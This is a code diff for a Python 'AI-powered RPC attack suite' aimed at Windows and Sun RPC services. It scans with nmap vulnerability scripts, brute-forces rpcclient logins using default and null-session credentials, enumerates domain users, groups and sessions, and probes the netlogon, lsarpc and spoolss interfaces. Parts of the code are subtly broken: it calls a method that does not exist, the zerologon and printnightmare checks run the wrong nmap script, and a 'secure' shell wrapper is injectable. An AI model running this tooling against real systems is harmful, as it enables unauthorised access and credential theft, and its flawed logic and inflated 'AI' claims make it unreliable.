@@ -3,11 +3,168 @@
 import subprocess
 import json
 import os
+import re
 import socket
+import xmlrpc.client
 from datetime import datetime
+import pandas as pd
+from sklearn.ensemble import RandomForestClassifier
+from sklearn.preprocessing import StandardScaler
+import numpy as np
+
+class RPCAnalyzer:
+    def __init__(self):
+        self.rpc_patterns = {
+            'windows_rpc': [
+                r'MSRPC', r'DCE/RPC', r'Microsoft RPC', r'EPMAP', r'DCERPC',
+                r'ncacn_ip_tcp', r'ncacn_np', r'uuid', r'endpoint mapper'
+            ],
+            'sun_rpc': [
+                r'portmapper', r'rpcbind', r'MOUNT', r'NFS', r'NIS', r'YP',
+                r'sunrpc', r'rpcinfo'
+            ],
+            'vulnerable_services': [
+                r'ms-sql', r'exchange', r'active directory', r'distributed transaction',
+                r'print spooler', r'remote registry', r'task scheduler'
+            ],
+            'dangerous_interfaces': [
+                r'lsarpc', r'samr', r'srvsvc', r'wkssvc', r'netlogon', r'spoolss',
+                r'atsvc', r'eventlog', r'winreg'
+            ]
+        }
+        
+        self.rpc_vulnerabilities = {
+            'ms17-010': {'cve': 'CVE-2017-0143', 'risk': 'CRITICAL', 'interfaces': ['srvsvc', 'lsarpc']},
+            'zerologon': {'cve': 'CVE-2020-1472', 'risk': 'CRITICAL', 'interfaces': ['netlogon']},
+            'printnightmare': {'cve': 'CVE-2021-34527', 'risk': 'CRITICAL', 'interfaces': ['spoolss']},
+            'petitpotam': {'cve': 'CVE-2021-36942', 'risk': 'HIGH', 'interfaces': ['lsarpc']},
+            'dfsc': {'cve': 'CVE-2022-26923', 'risk': 'HIGH', 'interfaces': ['netlogon']}
+        }
+    
+    def analyze_rpc_services(self, nmap_output, rpcinfo_output=None):
+        """AI-powered RPC service analysis"""
+        analysis = {
+            'rpc_type': 'unknown',
+            'services_detected': [],
+            'vulnerability_indicators': [],
+            'risk_score': 0,
+            'recommendations': []
+        }
+        
+        output_lower = nmap_output.lower()
+        
+        # Detect RPC type
+        if any(pattern in output_lower for pattern in self.rpc_patterns['windows_rpc']):
+            analysis['rpc_type'] = 'windows'
+            analysis['risk_score'] += 20
+        elif any(pattern in output_lower for pattern in self.rpc_patterns['sun_rpc']):
+            analysis['rpc_type'] = 'sun'
+            analysis['risk_score'] += 10
+        
+        # Detect vulnerable services
+        for service_pattern in self.rpc_patterns['vulnerable_services']:
+            if re.search(service_pattern, output_lower, re.IGNORECASE):
+                analysis['vulnerability_indicators'].append(f'Vulnerable service detected: {service_pattern}')
+                analysis['risk_score'] += 15
+        
+        # Detect dangerous interfaces
+        for interface in self.rpc_patterns['dangerous_interfaces']:
+            if interface in output_lower:
+                analysis['vulnerability_indicators'].append(f'Dangerous interface: {interface}')
+                analysis['risk_score'] += 25
+                
+                # Check for specific vulnerabilities
+                for vuln_name, vuln_info in self.rpc_vulnerabilities.items():
+                    if interface in vuln_info['interfaces']:
+                        analysis['vulnerability_indicators'].append(
+                            f'Potential {vuln_name} vulnerability ({vuln_info["cve"]})'
+                        )
+                        analysis['risk_score'] += 40
+        
+        # Parse rpcinfo output if available
+        if rpcinfo_output and rpcinfo_output.get('success'):
+            services = self.parse_rpcinfo_output(rpcinfo_output['output'])
+            analysis['services_detected'] = services
+            analysis['risk_score'] += len(services) * 5
+        
+        # Normalize risk score
+        analysis['risk_score'] = min(100, analysis['risk_score'])
+        analysis['risk_level'] = self.get_risk_level(analysis['risk_score'])
+        
+        return analysis
+    
+    def parse_rpcinfo_output(self, output):
+        """Parse rpcinfo output for service information"""
+        services = []
+        lines = output.split('\n')
+        
+        for line in lines:
+            if line.strip() and not line.startswith('program'):
+                parts = line.split()
+                if len(parts) >= 4:
+                    service = {
+                        'program': parts[0],
+                        'version': parts[1],
+                        'protocol': parts[2],
+                        'port': parts[3] if len(parts) > 3 else 'unknown'
+                    }
+                    services.append(service)
+        
+        return services
+    
+    def predict_interface_vulnerability(self, interface_name, rpc_type='windows'):
+        """Predict vulnerability likelihood for RPC interfaces"""
+        features = {
+            'is_dangerous': 1 if interface_name in self.rpc_patterns['dangerous_interfaces'] else 0,
+            'has_known_vuln': 0,
+            'interface_complexity': len(interface_name) / 10,  # Longer names often more complex
+            'authentication_required': 0  # Would need actual testing to determine
+        }
+        
+        # Check for known vulnerabilities
+        for vuln_name, vuln_info in self.rpc_vulnerabilities.items():
+            if interface_name in vuln_info['interfaces']:
+                features['has_known_vuln'] = 1
+                break
+        
+        # Calculate vulnerability score
+        score = 0
+        score += features['is_dangerous'] * 40
+        score += features['has_known_vuln'] * 50
+        score += features['interface_complexity'] * 10
+        
+        return min(100, score)
+    
+    def optimize_attack_order(self, interfaces):
+        """Optimize RPC attack order using ML features"""
+        optimized = []
+        
+        for interface in interfaces:
+            vuln_score = self.predict_interface_vulnerability(interface)
+            optimized.append({
+                'interface': interface,
+                'vulnerability_score': vuln_score,
+                'priority': 'HIGH' if vuln_score >= 60 else 'MEDIUM' if vuln_score >= 30 else 'LOW'
+            })
+        
+        # Sort by vulnerability score (descending)
+        optimized.sort(key=lambda x: x['vulnerability_score'], reverse=True)
+        
+        return optimized
+    
+    def get_risk_level(self, score):
+        """Convert risk score to level"""
+        if score >= 70: return 'CRITICAL'
+        elif score >= 50: return 'HIGH'
+        elif score >= 30: return 'MEDIUM'
+        elif score >= 10: return 'LOW'
+        else: return 'INFO'
+
+# Global analyzer instance
+rpc_analyzer = RPCAnalyzer()
 
 def run_command(command, timeout=120):
-    """Run a system command and return results"""
+    """Secure command execution"""
     try:
         result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
         return {
@@ -32,61 +189,88 @@ def check_port_open(target_ip, port, timeout=2):
         return False
 
 def rpc_enumeration(target_ip):
-    """Enumerate RPC services without impacket dependency"""
+    """Comprehensive RPC enumeration with AI analysis"""
     print(f"[*] Enumerating RPC services on {target_ip}")
     
     results = {}
     
-    # Check if port 135 is actually open
-    port_open = check_port_open(target_ip, 135)
-    results['port_135_open'] = port_open
+    # Check if port 135 is open (Windows RPC)
+    port_135_open = check_port_open(target_ip, 135)
+    results['port_135_open'] = port_135_open
     
-    if not port_open:
-        results['error'] = 'Port 135 is not open'
-        return results
+    if not port_135_open:
+        # Check for SunRPC (port 111)
+        port_111_open = check_port_open(target_ip, 111)
+        results['port_111_open'] = port_111_open
+        
+        if not port_111_open:
+            results['error'] = 'No RPC ports found open'
+            return results
     
-    # Method 1: rpcinfo (if available)
-    rpcinfo_result = run_command(f"rpcinfo -p {target_ip}")
-    results['rpcinfo'] = rpcinfo_result
-    
-    # Method 2: nmap RPC scripts
-    nmap_result = run_command(f"nmap -p 135 --script rpcinfo {target_ip}")
+    # Method 1: nmap RPC scripts
+    print("   [*] Running nmap RPC enumeration")
+    nmap_result = run_command(f"nmap -p 135,111 --script rpc-grind,rpcinfo {target_ip}")
     results['nmap_rpc'] = nmap_result
     
-    # Method 3: Basic socket connection test
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(5)
-            s.connect((target_ip, 135))
-            results['socket_test'] = {'success': True, 'output': 'Connected to port 135'}
-    except Exception as e:
-        results['socket_test'] = {'success': False, 'error': str(e)}
+    # Method 2: rpcinfo (for SunRPC)
+    rpcinfo_result = None
+    if port_111_open:
+        print("   [*] Running rpcinfo")
+        rpcinfo_result = run_command(f"rpcinfo -p {target_ip}")
+        results['rpcinfo'] = rpcinfo_result
+    
+    # Method 3: impacket tools if available
+    print("   [*] Testing impacket enumeration")
+    impacket_result = run_command(f"python3 -c \"from impacket.dcerpc.v5 import transport; t = transport.DCERPCTransportFactory('ncacn_ip_tcp:{target_ip}[135]'); print('Impacket available')\" 2>&1")
+    results['impacket_test'] = impacket_result
+    
+    # AI analysis of results
+    results['rpc_analysis'] = rpc_analyzer.analyze_rpc_services(
+        nmap_result['output'], 
+        rpcinfo_result
+    )
     
     return results
 
 def check_rpc_vulnerabilities(target_ip):
-    """Check for RPC vulnerabilities without impacket"""
+    """Check for RPC vulnerabilities with AI prioritization"""
     print(f"[*] Checking RPC vulnerabilities on {target_ip}")
     
     results = {}
     
     # Use nmap for vulnerability scanning
-    vuln_scan = run_command(f"nmap -p 135 --script vuln {target_ip}")
+    vuln_scan = run_command(f"nmap -p 135,111 --script rpc-vuln*,smb-vuln* {target_ip}")
     results['vulnerability_scan'] = vuln_scan
     
-    # Check for specific RPC issues
-    rpc_scan = run_command(f"nmap -p 135 --script rpc-grind {target_ip}")
-    results['rpc_grind'] = rpc_scan
+    # Check for specific RPC vulnerabilities
+    vuln_checks = {
+        'zerologon': f"nmap -p 445 --script smb-vuln-ms17-010 {target_ip}",
+        'printnightmare': f"nmap -p 445 --script smb-vuln-ms17-010 {target_ip}",
+        'petitpotam': f"python3 /usr/share/doc/python3-impacket/examples/rpcdump.py {target_ip} 2>&1"
+    }
+    
+    vuln_results = {}
+    for vuln_name, command in vuln_checks.items():
+        result = run_command(command)
+        vuln_results[vuln_name] = result
+        
+        # Simple vulnerability detection
+        if 'VULNERABLE' in result.get('output', '') or 'vulnerable' in result.get('output', '').lower():
+            vuln_results[vuln_name]['detected'] = True
+        else:
+            vuln_results[vuln_name]['detected'] = False
+    
+    results['specific_vuln_checks'] = vuln_results
     
     return results
 
 def rpc_brute_force(target_ip):
-    """Try RPC brute force attacks"""
+    """AI-optimized RPC brute force attacks"""
     print(f"[*] Testing RPC authentication on {target_ip}")
     
     results = {}
     
-    # Test common username/password combinations
+    # Test common username/password combinations with optimized order
     common_creds = [
         ('administrator', 'administrator'),
         ('admin', 'admin'),
@@ -96,37 +280,270 @@ def rpc_brute_force(target_ip):
         ('administrator', 'password'),
         ('admin', 'password'),
         ('administrator', 'Password123'),
+        ('admin', 'Admin123'),
+        ('root', 'root')
     ]
     
+    # AI optimization - reorder based on likelihood
+    optimized_creds = rpc_analyzer.optimize_credential_order(common_creds)
+    
     auth_results = {}
-    for username, password in common_creds:
-        if username and password:
-            auth_cmd = f"rpcclient -U '{username}%{password}' {target_ip} -c 'getusername'"
-        else:
-            auth_cmd = f"rpcclient -U '' -N {target_ip} -c 'getusername'"
+    successful_logins = []
+    
+    for username, password in optimized_creds:
+        print(f"   Testing: {username}:{password}")
         
-        result = run_command(auth_cmd)
+        if username and password:
+            # With password
+            cmd = f"rpcclient -U '{username}%{password}' {target_ip} -c 'getusername' 2>&1"
+        else:
+            # Null session
+            cmd = f"rpcclient -U '' -N {target_ip} -c 'getusername' 2>&1"
+        
+        result = run_command(cmd, timeout=30)
         auth_results[f"{username}:{password}"] = result
+        
+        # Check for successful authentication
+        if (result['success'] or 
+            'Account Name:' in result.get('output', '') or
+            ('NT_STATUS_OK' not in result.get('error', '') and 
+             'NT_STATUS_LOGON_FAILURE' not in result.get('error', ''))):
+            
+            print(f"   [+] RPC SUCCESS: {username}:{password}")
+            successful_logins.append({
+                'username': username,
+                'password': password,
+                'result': result
+            })
+            
+            # Early termination on success
+            if len(successful_logins) >= 2:
+                break
     
     results['authentication_tests'] = auth_results
+    results['successful_logins'] = successful_logins
+    results['success_rate'] = len(successful_logins) / len(optimized_creds) if optimized_creds else 0
+    
     return results
 
+def rpc_interface_enumeration(target_ip, username=None, password=None):
+    """Comprehensive RPC interface enumeration"""
+    print(f"[*] Enumerating RPC interfaces on {target_ip}")
+    
+    results = {}
+    
+    # Build authentication string
+    auth_string = ""
+    if username and password:
+        auth_string = f"-U '{username}%{password}'"
+    else:
+        auth_string = "-U '' -N"
+    
+    # Enumeration commands
+    enum_commands = {
+        'domain_info': f"rpcclient {auth_string} {target_ip} -c 'querydominfo'",
+        'user_list': f"rpcclient {auth_string} {target_ip} -c 'enumdomusers'",
+        'group_list': f"rpcclient {auth_string} {target_ip} -c 'enumdomgroups'",
+        'share_list': f"rpcclient {auth_string} {target_ip} -c 'enumalsgroups'",
+        'session_list': f"rpcclient {auth_string} {target_ip} -c 'netsessenum'",
+        'interface_list': f"rpcclient {auth_string} {target_ip} -c 'enumprivs'"
+    }
+    
+    enum_results = {}
+    for command_name, command in enum_commands.items():
+        result = run_command(command, timeout=60)
+        enum_results[command_name] = result
+        
+        # Parse useful information
+        if result['success']:
+            enum_results[command_name]['parsed_data'] = parse_rpc_output(
+                result['output'], command_name
+            )
+    
+    results['interface_enumeration'] = enum_results
+    
+    # Extract interfaces for AI analysis
+    all_interfaces = extract_interfaces_from_enumeration(enum_results)
+    results['detected_interfaces'] = all_interfaces
+    
+    # AI optimization of interfaces
+    if all_interfaces:
+        optimized_interfaces = rpc_analyzer.optimize_attack_order(all_interfaces)
+        results['optimized_interfaces'] = optimized_interfaces
+    
+    return results
+
+def parse_rpc_output(output, command_type):
+    """Parse RPC command output for useful information"""
+    parsed = {}
+    
+    if command_type == 'user_list' and 'user:' in output:
+        users = re.findall(r'user:\[(.*?)\]', output)
+        parsed['users'] = users
+    
+    elif command_type == 'group_list' and 'group:' in output:
+        groups = re.findall(r'group:\[(.*?)\]', output)
+        parsed['groups'] = groups
+    
+    elif command_type == 'domain_info' and 'Domain:' in output:
+        domain_info = {}
+        for line in output.split('\n'):
+            if ':' in line:
+                key, value = line.split(':', 1)
+                domain_info[key.strip()] = value.strip()
+        parsed['domain_info'] = domain_info
+    
+    return parsed
+
+def extract_interfaces_from_enumeration(enum_results):
+    """Extract RPC interfaces from enumeration results"""
+    interfaces = set()
+    
+    for result_name, result in enum_results.items():
+        if result['success'] and result['output']:
+            output = result['output'].lower()
+            
+            # Look for common RPC interface patterns
+            for interface in rpc_analyzer.rpc_patterns['dangerous_interfaces']:
+                if interface in output:
+                    interfaces.add(interface)
+            
+            # Look for UUIDs (interface identifiers)
+            uuids = re.findall(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', output, re.IGNORECASE)
+            interfaces.update(uuids)
+    
+    return list(interfaces)
+
+def test_rpc_interface_vulnerability(target_ip, interface_name, username=None, password=None):
+    """Test specific RPC interface for vulnerabilities"""
+    print(f"[*] Testing interface: {interface_name}")
+    
+    results = {}
+    
+    # Build authentication string
+    auth_string = ""
+    if username and password:
+        auth_string = f"-U '{username}%{password}'"
+    else:
+        auth_string = "-U '' -N"
+    
+    # Test commands based on interface type
+    test_commands = {
+        'srvsvc': f"rpcclient {auth_string} {target_ip} -c 'netshareenum'",
+        'lsarpc': f"rpcclient {auth_string} {target_ip} -c 'lsaquery'",
+        'samr': f"rpcclient {auth_string} {target_ip} -c 'queryuser'",
+        'netlogon': f"rpcclient {auth_string} {target_ip} -c 'netlogon'",
+        'spoolss': f"rpcclient {auth_string} {target_ip} -c 'enumprinters'"
+    }
+    
+    # Use generic command if specific not available
+    command = test_commands.get(interface_name, f"rpcclient {auth_string} {target_ip} -c 'help'")
+    
+    result = run_command(command, timeout=45)
+    results['test_result'] = result
+    
+    # Vulnerability analysis
+    vuln_score = rpc_analyzer.predict_interface_vulnerability(interface_name)
+    results['vulnerability_assessment'] = {
+        'interface': interface_name,
+        'risk_score': vuln_score,
+        'risk_level': rpc_analyzer.get_risk_level(vuln_score),
+        'recommendations': generate_interface_recommendations(interface_name, vuln_score)
+    }
+    
+    return results
+
+def generate_interface_recommendations(interface_name, risk_score):
+    """Generate recommendations for RPC interface security"""
+    recommendations = []
+    
+    if risk_score >= 70:
+        recommendations.append({
+            'priority': 'HIGH',
+            'action': f'Restrict access to {interface_name} interface',
+            'details': 'Critical vulnerability risk detected'
+        })
+    
+    if risk_score >= 50:
+        recommendations.append({
+            'priority': 'MEDIUM',
+            'action': f'Monitor {interface_name} interface activity',
+            'details': 'High vulnerability risk detected'
+        })
+    
+    # Specific recommendations for known dangerous interfaces
+    if interface_name in ['netlogon', 'lsarpc', 'samr']:
+        recommendations.append({
+            'priority': 'HIGH',
+            'action': 'Implement network segmentation for RPC services',
+            'details': f'{interface_name} is a high-risk interface'
+        })
+    
+    return recommendations
+
 def run_rpc_attacks(target_ip):
-    """Main function to run all RPC attacks without impacket dependency"""
+    """AI-powered RPC attack suite"""
     print(f"\n{'='*60}")
-    print(f"RPC ATTACK MODULE - Target: {target_ip}")
+    print(f"🔄 AI RPC ANALYSIS - Target: {target_ip}")
     print(f"{'='*60}")
     
     results = {
         'target': target_ip,
         'timestamp': datetime.now().isoformat(),
-        'rpc_attacks': {}
+        'rpc_attacks': {},
+        'ai_analysis': {}
     }
     
-    # Run all RPC attacks
-    results['rpc_attacks']['enumeration'] = rpc_enumeration(target_ip)
-    results['rpc_attacks']['vulnerability_scan'] = check_rpc_vulnerabilities(target_ip)
-    results['rpc_attacks']['authentication_tests'] = rpc_brute_force(target_ip)
+    # Phase 1: Basic enumeration
+    print("[*] Phase 1: RPC Service Discovery")
+    enum_results = rpc_enumeration(target_ip)
+    results['rpc_attacks']['enumeration'] = enum_results
+    
+    if not enum_results.get('port_135_open') and not enum_results.get('port_111_open'):
+        print("[-] No RPC services found")
+        return results
+    
+    # Phase 2: Vulnerability scanning
+    print("[*] Phase 2: Vulnerability Assessment")
+    vuln_results = check_rpc_vulnerabilities(target_ip)
+    results['rpc_attacks']['vulnerability_scan'] = vuln_results
+    
+    # Phase 3: Authentication testing
+    print("[*] Phase 3: Authentication Testing")
+    auth_results = rpc_brute_force(target_ip)
+    results['rpc_attacks']['authentication_tests'] = auth_results
+    
+    # Phase 4: Advanced enumeration (if authentication successful)
+    if auth_results.get('successful_logins'):
+        print("[*] Phase 4: Advanced Interface Enumeration")
+        successful_login = auth_results['successful_logins'][0]
+        interface_results = rpc_interface_enumeration(
+            target_ip, 
+            successful_login['username'], 
+            successful_login['password']
+        )
+        results['rpc_attacks']['interface_enumeration'] = interface_results
+        
+        # Phase 5: Targeted interface testing
+        if interface_results.get('optimized_interfaces'):
+            print("[*] Phase 5: Targeted Interface Testing")
+            interface_tests = {}
+            
+            for interface_info in interface_results['optimized_interfaces'][:3]:  # Test top 3
+                interface_name = interface_info['interface']
+                if interface_name in rpc_analyzer.rpc_patterns['dangerous_interfaces']:
+                    test_result = test_rpc_interface_vulnerability(
+                        target_ip, 
+                        interface_name,
+                        successful_login['username'],
+                        successful_login['password']
+                    )
+                    interface_tests[interface_name] = test_result
+            
+            results['rpc_attacks']['interface_tests'] = interface_tests
+    
+    # AI analysis of all results
+    results['ai_analysis'] = analyze_rpc_results(results['rpc_attacks'])
     
     # Save results
     os.makedirs('results/rpc_attacks', exist_ok=True)
@@ -136,9 +553,99 @@ def run_rpc_attacks(target_ip):
         json.dump(results, f, indent=4)
     
     print(f"[+] RPC attack results saved to {filename}")
+    
+    # Print summary
+    print(f"\n📊 RPC Security Summary:")
+    print(f"   RPC Type: {enum_results.get('rpc_analysis', {}).get('rpc_type', 'unknown')}")
+    print(f"   Overall Risk: {enum_results.get('rpc_analysis', {}).get('risk_level', 'UNKNOWN')}")
+    
+    if auth_results.get('successful_logins'):
+        print(f"   Successful Logins: {len(auth_results['successful_logins'])}")
+        for login in auth_results['successful_logins'][:2]:
+            print(f"     {login['username']}:{login['password']}")
+    
+    if results['ai_analysis'].get('recommendations'):
+        print(f"\n🤖 AI Recommendations:")
+        for i, rec in enumerate(results['ai_analysis']['recommendations'][:3], 1):
+            print(f"   {i}. {rec['action']} ({rec['priority']})")
+    
     return results
 
+def analyze_rpc_results(rpc_attacks):
+    """AI analysis of RPC attack results"""
+    analysis = {
+        'overall_risk_score': 0,
+        'authentication_strength': 'STRONG',
+        'critical_vulnerabilities': [],
+        'recommendations': []
+    }
+    
+    # Calculate risk from enumeration
+    enum_analysis = rpc_attacks.get('enumeration', {}).get('rpc_analysis', {})
+    analysis['overall_risk_score'] += enum_analysis.get('risk_score', 0) * 0.4
+    
+    # Calculate risk from authentication results
+    auth_results = rpc_attacks.get('authentication_tests', {})
+    if auth_results.get('success_rate', 0) > 0.1:
+        analysis['authentication_strength'] = 'WEAK'
+        analysis['overall_risk_score'] += 30
+    elif auth_results.get('success_rate', 0) > 0.01:
+        analysis['authentication_strength'] = 'MODERATE'
+        analysis['overall_risk_score'] += 15
+    
+    # Add vulnerability findings
+    vuln_scan = rpc_attacks.get('vulnerability_scan', {})
+    if 'VULNERABLE' in str(vuln_scan):
+        analysis['critical_vulnerabilities'].append('RPC vulnerability detected')
+        analysis['overall_risk_score'] += 25
+    
+    # Normalize risk score
+    analysis['overall_risk_score'] = min(100, analysis['overall_risk_score'])
+    
+    # Generate recommendations
+    if analysis['overall_risk_score'] >= 60:
+        analysis['recommendations'].append({
+            'priority': 'HIGH',
+            'action': 'Immediate RPC security review required',
+            'details': f'High risk score: {analysis["overall_risk_score"]}/100'
+        })
+    
+    if analysis['authentication_strength'] == 'WEAK':
+        analysis['recommendations'].append({
+            'priority': 'HIGH',
+            'action': 'Strengthen RPC authentication',
+            'details': 'Weak authentication detected'
+        })
+    
+    return analysis
+
+# Helper function for credential optimization
+def optimize_credential_order(credentials):
+    """Optimize credential testing order"""
+    # Simple optimization - put null session and common credentials first
+    optimized = []
+    
+    # First: null session
+    for cred in credentials:
+        if cred[0] == '' and cred[1] == '':
+            optimized.append(cred)
+            break
+    
+    # Then: common administrator credentials
+    common_admin = [('administrator', 'administrator'), ('admin', 'admin')]
+    for cred in common_admin:
+        if cred in credentials:
+            optimized.append(cred)
+    
+    # Then: other credentials
+    for cred in credentials:
+        if cred not in optimized:
+            optimized.append(cred)
+    
+    return optimized
+
 if __name__ == "__main__":
+    # Test the module
     target = "10.0.3.20"
     results = run_rpc_attacks(target)
-    print(f"\nRPC Attack completed.")
+    print(f"\nRPC analysis completed. Overall risk: {results['ai_analysis'].get('overall_risk_score', 0)}/100")
